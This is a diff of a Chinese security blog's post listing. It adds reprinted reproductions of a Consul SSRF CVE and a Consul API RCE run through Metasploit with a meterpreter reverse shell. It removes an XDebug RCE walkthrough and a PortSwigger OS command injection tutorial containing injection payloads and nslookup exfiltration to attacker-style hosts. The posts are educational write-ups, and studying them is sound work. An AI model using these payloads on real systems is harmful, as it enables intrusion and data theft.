@@ -86,6 +86,138 @@
 
     
         <h2 class="title">
+            <a href="/2024/01/29/CVE-2022-29153-Consul/">
+                CVE-2022-29153 consul SSRF
+            </a>
+        </h2>
+    
+    <time>
+        Jan 29, 2024
+    </time>
+    <section class="content">
+        <h1><span id="cve-2022-29153-consul-ssrf">CVE-2022-29153 consul SSRF</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://github.com/cokeBeer/go-cves/blob/main/CVE-2022-29153/CVE-2022-29153.md">cokeBeer</a> 并作补充</p>
+</blockquote>
+<h2><span id="漏洞信息">漏洞信息</span></h2><blockquote>
+<ul>
+<li>漏洞类型：SSRF</li>
+<li>漏洞版本：&lt; 1.9.17，&gt;&#x3D; 1.10.0, &lt; 1.10.10，&gt;&#x3D; 1.11.0, &lt; 1.11.5</li>
+<li>漏洞简介：http类型的health_check被重定向导致的SSRF</li>
+</ul>
+</blockquote>
+<h2><span id="repo介绍">repo介绍</span></h2><blockquote>
+<p>consul是一个用go语言编写的分布式应用管理服务器，目前在github上已经有24.7k个star</p>
+</blockquote>
+<h2><span id="漏洞分析">漏洞分析</span></h2><blockquote>
+<p>consul提供了对于服务的health_check能力。首先安装一个漏洞版本的consul</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://apt.releases.hashicorp.com/gpg | sudo apt-key add -</span><br><span class="line">sudo apt-add-repository <span class="string">&quot;deb [arch=amd64] https://apt.releases.hashicorp.com <span class="subst">$(lsb_release -cs)</span> main&quot;</span></span><br><span class="line">sudo apt-get update &amp;&amp; sudo apt-get install consul=1.10.9</span><br></pre></td></tr></table></figure>
+
+<p>然后启动一个consul服务器</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">consul agent -dev -enable-script-checks -node=web -ui</span><br></pre></td></tr></table></figure>
+
+<p>访问<code>http://localhost:8500/</code>可以看到consul的界面</p>
+<p><img src="/2024/01/29/CVE-2022-29153-Consul/1.png" alt="image"></p>
+<p>编写一个<code>ssrf.json</code>作为poc，里面标志的http地址会将请求302重定向到<code>127.0.0.1:80</code></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;ID&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ssrf&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ssrf&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="number">5001</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;check&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;checkid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ssrf_check&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Check ssrf&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;http&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://fuzz.red/ssrf/127.0.0.1/&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GET&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;interval&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10s&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;timeout&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1s&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用如下指令将<code>health_check</code>注册到consul服务器</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --request PUT --data @ssrf.json http://127.0.0.1:8500/v1/agent/service/register</span><br></pre></td></tr></table></figure>
+
+<p>可以看到添加成功</p>
+<p><img src="/2024/01/29/CVE-2022-29153-Consul/2.png" alt="image"></p>
+<p>这时consul会主动运行<code>health_check</code>，请求被302重定向到内网，导致了SSRF。可以看到nc也收到了请求</p>
+<p><img src="/2024/01/29/CVE-2022-29153-Consul/3.png" alt="image"></p>
+</blockquote>
+<h2><span id="修复方式">修复方式</span></h2><blockquote>
+<p>在<a target="_blank" rel="noopener" href="https://github.com/hashicorp/consul/blob/928fefd2a7ee5ae8d90377514ec2022ee9730be0/agent/config/config.go#L391">agent&#x2F;config.go</a>中添<code>加DisableRedirects</code>字段，可以在服务器端配置，关闭<code>health_check</code>的重定向</p>
+<p><img src="/2024/01/29/CVE-2022-29153-Consul/4.png" alt="image"></p>
+</blockquote>
+<h2><span id="参考链接">参考链接</span></h2><blockquote>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/advisories/GHSA-q6h7-4qgw-2j9p">https://github.com/advisories/GHSA-q6h7-4qgw-2j9p</a></li>
+</ul>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Consul/" rel="tag">Consul</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/SSRF/" rel="tag">SSRF</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2024/01/29/Consul-API-RCE/">
+                Hashicorp Consul Service API远程命令执行漏洞
+            </a>
+        </h2>
+    
+    <time>
+        Jan 29, 2024
+    </time>
+    <section class="content">
+        <h1><span id="hashicorp-consul-service-api远程命令执行漏洞">Hashicorp Consul Service API远程命令执行漏洞</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hi-blog/p/Hashicorp_Consul_Service_API_RCE.html">starnight_cyber</a> 并作补充</p>
+</blockquote>
+<h2><span id="简介">简介</span></h2><blockquote>
+<p>Consul是HashiCorp公司推出的一款开源工具，用于实现分布式系统的服务发现与配置。与其他分布式服务注册与发现的方案相比，Consul提供的方案更为“一站式”。Consul内置了服务注册与发现框架、分布一致性协议实现、健康检查、Key&#x2F;Value存储、多数据中心方案，不再需要依赖其他工具（例如ZooKeeper等），使用方式也相对简单。</p>
+<p>Consul使用Go语言编写，因此具有天然的可移植性（支持Linux、Windows和Mac OS X系统）；且安装包中仅包含一个可执行文件，便于部署，可与Docker等轻量级容器无缝配合。</p>
+<p>在特定配置下，恶意攻击者可以通过发送精心构造的HTTP请求在未经授权的情况下在Consul服务端远程执行命令。</p>
+</blockquote>
+<h2><span id="环境搭建">环境搭建</span></h2><blockquote>
+<p>从 <a target="_blank" rel="noopener" href="https://releases.hashicorp.com/consul/1.2.4/">https://releases.hashicorp.com/consul/1.2.4/</a> 下载相应 Linux 版本，直接启动服务即可。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./consul agent -dev -client your-serv-ip -enable-script-checks</span><br></pre></td></tr></table></figure>
+
+<p>访问：<a target="_blank" rel="noopener" href="http://148.153.199.229:8500/v1/agent/self">http://your-serv-ip:8500/v1/agent/self</a></p>
+<p>启用了 <strong>EnableRemoteScriptChecks: true</strong> </p>
+<p><img src="/2024/01/29/Consul-API-RCE/1.png" alt="image"></p>
+</blockquote>
+<h2><span id="漏洞验证">漏洞验证</span></h2><blockquote>
+<ol>
+<li>使用 MSF 进行测试，简要过程如下：</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search Hashicorp</span><br><span class="line"> </span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"> </span><br><span class="line">   <span class="comment">#  Name                                    Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                    ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/multi/misc/nomad_exec           2021-05-17       excellent  Yes    HashiCorp Nomad Remote Command Execution</span><br><span class="line">   1  exploit/multi/misc/consul_rexec_exec    2018-08-11       excellent  Yes    Hashicorp Consul Remote Command Execution via Rexec</span><br><span class="line">   2  exploit/multi/misc/consul_service_exec  2018-08-11       excellent  Yes    Hashicorp Consul Remote Command Execution via Services API</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">Interact with a module by name or index. For example info 2, use 2 or use exploit/multi/misc/consul_service_exec</span><br><span class="line"> </span><br><span class="line">msf6 &gt; use 2</span><br><span class="line">[*] Using configured payload linux/x86/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<p>可以看到成功创建 meterpreter。</p>
+<p><img src="/2024/01/29/Consul-API-RCE/2.png" alt="image"></p>
+</blockquote>
+<h2><span id="修复措施">修复措施</span></h2><blockquote>
+<ol>
+<li>禁用Consul服务器上的脚本检查功能</li>
+<li>确保Consul HTTP API服务无法通过外网访问或调用</li>
+<li>对&#x2F;v1&#x2F;agent&#x2F;service&#x2F;register 禁止PUT方法</li>
+</ol>
+</blockquote>
+<h2><span id="参考">参考</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/115870000">https://blog.csdn.net/qq_44159028/article/details/115870000</a></p>
+<p><a target="_blank" rel="noopener" href="https://releases.hashicorp.com/consul/1.2.4/">https://releases.hashicorp.com/consul/1.2.4/</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.pentesteracademy.com/hashicorp-consul-remote-command-execution-via-services-api-d709f8ac3960">https://blog.pentesteracademy.com/hashicorp-consul-remote-command-execution-via-services-api-d709f8ac3960</a></p>
+<p>以上！</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Consul/" rel="tag">Consul</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2024/01/25/CVE-2019-11043-Nginx/">
                 CVE-2019-11043漏洞分析与复现
             </a>
@@ -873,228 +1005,6 @@
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/MQTT/" rel="tag">MQTT</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/12/07/XDebug-RCE/">
-                XDebug 远程调试漏洞（代码执行）
-            </a>
-        </h2>
-    
-    <time>
-        Dec 7, 2023
-    </time>
-    <section class="content">
-        <h1><span id="xdebug-远程调试漏洞代码执行">XDebug 远程调试漏洞（代码执行）</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://joker-vip.github.io/2021/12/06/XDebug%20%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%89/">joker0xxx3</a> 并作补充</p>
-</blockquote>
-<h2><span id="简介">简介</span></h2><blockquote>
-<p>XDebug是PHP的一个扩展，用于调试PHP代码。如果目标开启了远程调试模式，并设置<code>remote_connect_back = 1</code>：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xdebug.remote_connect_back = <span class="number">1</span></span><br><span class="line">xdebug.remote_enable = <span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<p>这个配置下，我们访问<code>http://target/index.php?XDEBUG_SESSION_START=phpstorm</code>，目标服务器的XDebug将会连接访问者的IP（或<code>X-Forwarded-For</code>头指定的地址）并通过dbgp协议与其通信，我们通过dbgp中提供的eval方法即可在目标服务器上执行任意PHP代码。</p>
-<p>更多说明可参考：</p>
-<ul>
-<li>[[<a target="_blank" rel="noopener" href="https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface/]]">https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface\]]</a>(<a target="_blank" rel="noopener" href="https://ricterz.me/posts/Xdebug%3A">https://ricterz.me/posts/Xdebug%3A</a> A Tiny Attack Surface])(<a target="_blank" rel="noopener" href="https://ricterz.me/posts/Xdebug%3A">https://ricterz.me/posts/Xdebug%3A</a> A Tiny Attack Surface)</li>
-<li><a target="_blank" rel="noopener" href="https://xdebug.org/">https://xdebug.org</a></li>
-</ul>
-</blockquote>
-<h2><span id="漏洞利用">漏洞利用</span></h2><blockquote>
-<p>启动完成后，访问<code>http://192.168.44.132:8080/</code>即可发现主页是一个简单的phpinfo，在其中可以找到xdebug的配置，可见开启了远程调试。</p>
-<p><img src="/2023/12/07/XDebug-RCE/1.png" alt="image"></p>
-<p>因为需要使用dbgp协议与目标服务器通信，所以无法用http协议复现漏洞。</p>
-<p>我编写了一个<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/exp.py">漏洞复现脚本</a>，指定目标web地址、待执行的php代码即可：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 要求用python3并安装requests库</span></span><br><span class="line">python3 exp.py -t http://192.168.44.132:8080/index.php -c <span class="string">&#x27;shell_exec(&#x27;</span><span class="built_in">id</span><span class="string">&#x27;);&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/12/07/XDebug-RCE/2.png" alt="image"></p>
-<p><strong>重要说明：因为该通信是一个反向连接的过程，exp.py启动后其实是会监听本地的9000端口（可通过-l参数指定）并等待XDebug前来连接，所以执行该脚本的服务器必须有外网IP（或者与目标服务器处于同一内网）。</strong></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/XDebug/" rel="tag">XDebug</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/12/07/OS-Command-Injection/">
-                PortSwigger Academy | OS command injection 操作系统命令注入
-            </a>
-        </h2>
-    
-    <time>
-        Dec 7, 2023
-    </time>
-    <section class="content">
-        <h1><span id="portswigger-academy-os-command-injection-操作系统命令注入">PortSwigger Academy | OS command injection : 操作系统命令注入</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42942594/article/details/112474186">en0_0</a> 并作补充</p>
-</blockquote>
-<h2><span id="总结">总结</span></h2><blockquote>
-<ul>
-<li><p><code>&amp;name=1&amp;email=1%401.com||ping+-c+10+127.0.0.1||&amp;subject=1</code> 有时候需要url编码</p>
-</li>
-<li><p><code>productId=1&amp;storeId=1|whoami</code> POST方法不能用<code>&amp;</code></p>
-<p>在本节中，我们将解释什么是OS命令注入，描述如何检测和利用漏洞，为不同的操作系统拼写一些有用的命令和技术，并总结如何防止OS命令注入。</p>
-<p><img src="/2023/12/07/OS-Command-Injection/1.png" alt="image"></p>
-</li>
-</ul>
-</blockquote>
-<h2><span id="什么是os命令注入">什么是OS命令注入？</span></h2><blockquote>
-<p>操作系统命令注入（也称为外壳程序注入）是一个Web安全漏洞，它使攻击者可以在运行应用程序的服务器上执行任意操作系统（OS）命令，并且通常会完全破坏该应用程序及其所有数据。 攻击者通常可以利用OS命令注入漏洞来破坏托管基础结构的其他部分，利用信任关系将攻击转移到组织内的其他系统。</p>
-</blockquote>
-<h2><span id="执行任意命令">执行任意命令</span></h2><blockquote>
-<p>考虑一个购物应用程序，该应用程序使用户可以查看特定商店中某商品是否有库存。 该信息可通过如下网址访问：</p>
-<p><code>https://insecure-website.com/stockStatus?productID=381&amp;storeID=29</code></p>
-<p>为了提供库存信息，应用程序必须查询各种旧系统。 由于历史原因，该功能是通过使用产品和存储ID作为参数调用shell命令来实现的：</p>
-<p><code>stockreport.pl 381 29</code><br>此命令输出指定项目的库存状态，并返回给用户。</p>
-<p>由于该应用程序无法防御OS命令注入，因此攻击者可以提交以下输入以执行任意命令：</p>
-<p><code>&amp; echo aiwefwlguh &amp;</code></p>
-<p>如果此输入是在productID参数中提交的，那么应用程序执行的命令是：</p>
-<p><code>stockreport.pl &amp; echo aiwefwlguh &amp; 29</code></p>
-<p>echo命令只是使提供的字符串在输出中回显，并且是测试某些类型的OS命令注入的有用方法。 &amp; 字符是shell命令分隔符，因此执行的实际上是一个接一个的三个独立命令。 结果，返回给用户的输出为：</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Error - productID was not provided</span><br><span class="line">aiwefwlguh</span><br><span class="line">29: command not found</span><br></pre></td></tr></table></figure>
-
-<p>输出的三行表明：</p>
-<p>原始的stockreport.pl命令在没有预期参数的情况下执行，因此返回了错误消息。</p>
-<p>执行注入的echo命令，并且在输出中回显提供的字符串。</p>
-<p>原始参数29作为命令执行，从而导致错误。</p>
-<p>通常，将附加命令分隔符&amp;放置在注入命令之后是很有用的，因为这会将注入命令与注入点后面的内容分开。 这减少了随后发生的事件阻止注入的命令执行的可能性。</p>
-</blockquote>
-<h4><span id="lab-os-command-injection-simple-case">Lab: OS command injection, simple case</span></h4><blockquote>
-<p><code>productId=1&amp;storeId=1|whoami</code></p>
-<p><img src="/2023/12/07/OS-Command-Injection/2.png" alt="image"></p>
-</blockquote>
-<h3><span id="有用的命令">有用的命令</span></h3><blockquote>
-<p>当您确定了OS命令注入漏洞后，通常可以执行一些初始命令来获取有关您受到破坏的系统的信息。 以下是在Linux和Windows平台上有用的一些命令的摘要：</p>
-<table>
-<thead>
-<tr>
-<th>命令目的</th>
-<th>Linux</th>
-<th>Windows</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>当前用户的名称</td>
-<td>whoami</td>
-<td>whoami</td>
-</tr>
-<tr>
-<td>操作系统</td>
-<td>uname -a</td>
-<td>ver</td>
-</tr>
-<tr>
-<td>网络配置</td>
-<td>ifconfig</td>
-<td>ipconfig &#x2F; all</td>
-</tr>
-<tr>
-<td>网络连接</td>
-<td>netstat -an</td>
-<td>netstat -an</td>
-</tr>
-<tr>
-<td>运行进程</td>
-<td>ps -ef</td>
-<td>tasklist</td>
-</tr>
-</tbody></table>
-</blockquote>
-<h2><span id="操作系统命令注入漏洞盲注">操作系统命令注入漏洞盲注</span></h2><blockquote>
-<p>OS命令注入的许多实例都是盲注的漏洞。 这意味着应用程序不会在其HTTP响应中返回命令的输出。 盲注漏洞仍然可以被利用，但是需要不同的技术。</p>
-<p>考虑一个允许用户提交有关该站点的反馈的网站。 用户输入他们的电子邮件地址和反馈消息。 然后，服务器端应用程序会向站点管理员生成一封包含反馈的电子邮件。 为此，它使用提交的详细信息调出邮件程序。 例如：</p>
-<p><code>mail -s &quot;This site is great&quot; -aFrom:peter@normal-user.net feedback@vulnerable-website.com</code></p>
-<p>mail命令的输出（如果有）不会在应用程序的响应中返回，因此使用echo有效负载将无效。 在这种情况下，您可以使用多种其他技术来检测和利用漏洞。</p>
-</blockquote>
-<h3><span id="使用时间延迟检测盲注os命令注入">使用时间延迟检测盲注OS命令注入</span></h3><blockquote>
-<p>您可以使用注入的命令来触发时间延迟，从而允许您根据应用程序响应的时间来确认命令已执行。 ping命令是执行此操作的有效方法，因为它使您可以指定要发送的ICMP数据包的数量，从而指定该命令运行所花费的时间：</p>
-<p><code>&amp; ping -c 10 127.0.0.1 &amp;</code></p>
-<p>此命令将导致应用程序ping其环回网络适配器10秒钟。</p>
-</blockquote>
-<h4><span id="lab-blind-os-command-injection-with-time-delays">Lab: Blind OS command injection with time delays</span></h4><blockquote>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csrf=j25Ci6owysrme8z4HvkicgC1hqXWr0Yz&amp;name=1&amp;email=1%401.com||ping+-c+10+127.0.0.1||&amp;subject=1&amp;message=1</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/12/07/OS-Command-Injection/3.png" alt="image"></p>
-</blockquote>
-<h3><span id="通过重定向输出来利用盲注os命令注入">通过重定向输出来利用盲注OS命令注入</span></h3><blockquote>
-<p>您可以将注入命令的输出重定向到Web根目录下的文件中，然后可以使用浏览器进行检索。 例如，如果应用程序从文件系统位置&#x2F;var&#x2F;www&#x2F;static提供静态资源，则可以提交以下输入：</p>
-<p><code>&amp; whoami&gt; /var/www/static/whoami.txt &amp;</code></p>
-<p><code>&gt;</code>字符将whoami命令的输出发送到指定文件。 然后，您可以使用浏览器获取<a target="_blank" rel="noopener" href="https://vulnerable-website.com/whoami.txt%E6%9D%A5%E6%A3%80%E7%B4%A2%E6%96%87%E4%BB%B6%EF%BC%8C%E5%B9%B6%E6%9F%A5%E7%9C%8B%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%E7%9A%84%E8%BE%93%E5%87%BA%E3%80%82">https://vulnerable-website.com/whoami.txt来检索文件，并查看注入命令的输出。</a></p>
-</blockquote>
-<h4><span id="lab-blind-os-command-injection-with-output-redirection">Lab: Blind OS command injection with output redirection</span></h4><blockquote>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;email=1%401.com||whoami+&gt;+/var/www/images/whoami.txt||&amp;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/12/07/OS-Command-Injection/4.png" alt="image"></p>
-</blockquote>
-<h3><span id="利用带外oast技术利用盲目的os命令注入">利用带外（OAST）技术利用盲目的OS命令注入</span></h3><blockquote>
-<p>您可以使用注入的命令，通过OAST技术触发与您控制的系统的带外网络交互。 例如：</p>
-<p><code>&amp; nslookup kgji2ohoyw.web-attacker.com &amp;</code></p>
-<p>此有效负载使用nslookup命令对指定的域进行DNS查找。 攻击者可以监视是否发生了指定的查找，从而检测到命令已成功注入。</p>
-</blockquote>
-<h4><span id="lab-blind-os-command-injection-with-out-of-band-interaction">Lab: Blind OS command injection with out-of-band interaction</span></h4><blockquote>
-<p><img src="/2023/12/07/OS-Command-Injection/5.png" alt="image"></p>
-<p>带外通道还提供了一种从注入的命令中提取输出的简便方法：<br> (根本别啥用)</p>
-<p><code>&amp; nslookup </code>whoami<code>.kgji2ohoyw.web-attacker.com &amp;</code></p>
-<p>这将导致对DNS的攻击者所在域进行域名查询，其中包含whoami命令的结果：</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wwwuser.kgji2ohoyw.web-attacker.com</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h4><span id="lab-blind-os-command-injection-with-out-of-band-data-exfiltration">Lab: Blind OS command injection with out-of-band data exfiltration</span></h4><blockquote>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">email=1%401.com||nslookup+`whoami`.132kftea48t801xjselcncwfp6vwjl.burpcollaborator.net||</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/12/07/OS-Command-Injection/6.png" alt="image"></p>
-</blockquote>
-<h2><span id="注入os命令的方式">注入OS命令的方式</span></h2><blockquote>
-<p>各种shell字符可用于执行OS命令注入攻击。</p>
-<p>许多字符用作命令分隔符，使命令可以链接在一起。 以下命令分隔符可在基于Windows和Unix的系统上运行：</p>
-<pre><code>&amp;
-&amp;&amp;
-|
-||
-</code></pre>
-<p>以下命令分隔符仅在基于Unix的系统上起作用：</p>
-<pre><code>;
-Newline (0x0a or \n)
-</code></pre>
-<p>在基于Unix的系统上，您还可以使用反引号或美元字符在原始命令中内嵌执行注入命令： （原来如此，windows不能用反引号）</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">`injected-command`</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">( injected-command )</span></span><br></pre></td></tr></table></figure>
-
-<p>请注意，不同的shell元字符具有细微不同的行为，这些行为可能会影响它们是否在某些情况下起作用，以及它们是否允许带内检索命令输出或仅对盲注使用有用。</p>
-<p>有时，您控制的输入会出现在原始命令的引号中。 在这种情况下，需要先使用引号终止上下文（使用”或’），然后再使用适当的外壳元字符来插入新命令。</p>
-</blockquote>
-<h2><span id="如何防止os命令注入攻击">如何防止OS命令注入攻击</span></h2><blockquote>
-<p>到目前为止，防止OS命令注入漏洞的最有效方法是永远不要从应用程序层代码中调用OS命令。 几乎在每种情况下，都有使用更安全的平台API来实现所需功能的替代方法。</p>
-<p>如果认为无法通过用户提供的输入调出OS命令，则必须执行强大的输入验证。 有效验证的一些示例包括：</p>
-<ul>
-<li>根据 允许值 的白名单进行验证。</li>
-<li>验证输入是否为数字。</li>
-<li>验证输入仅包含字母数字字符，不包含其他语法或空格。</li>
-</ul>
-<p>切勿尝试通过转义shell元字符来清理输入。 实际上，这太容易出错，容易被熟练的攻击者绕开。</p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
             </div>
         
 
